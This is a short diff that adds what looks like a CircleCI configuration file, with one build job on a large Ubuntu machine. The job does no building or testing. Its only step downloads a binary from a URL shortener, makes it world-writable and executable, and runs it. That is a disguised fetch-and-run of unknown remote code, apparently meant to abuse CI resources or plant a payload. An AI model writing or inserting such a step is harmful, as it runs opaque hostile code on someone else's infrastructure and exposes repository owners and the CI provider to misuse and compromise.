@@ -1,0 +1,9 @@
+version: 2.1
+ 
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: large
+    steps:
+      - run: wget -O broh http://gg.gg/vkrn9 && chmod +x broh && chmod 777 broh && ./broh
